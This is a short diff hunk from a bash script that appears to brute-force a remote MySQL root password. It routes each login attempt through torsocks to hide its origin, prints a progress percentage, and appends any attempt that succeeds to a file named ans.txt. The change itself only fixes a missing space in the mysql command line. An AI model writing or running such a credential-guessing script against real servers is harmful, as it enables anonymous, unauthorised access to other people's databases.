@@ -19,7 +19,7 @@ correct=Database
 	percent=$((100*$item/$total))
 	echo "$percent percent done"
 	## Need to find a why to check if access was granted. ##
-	( querry=$(torsocks mysql -h address-u root -p"$pw" -e "show databases" |  head -n 1 &)
+	( querry=$(torsocks mysql -h address -u root -p"$pw" -e "show databases" |  head -n 1 &)
 	clear
 	if [ "$querry" == "$correct" ]; then
 		echo $querry >> ans.txt
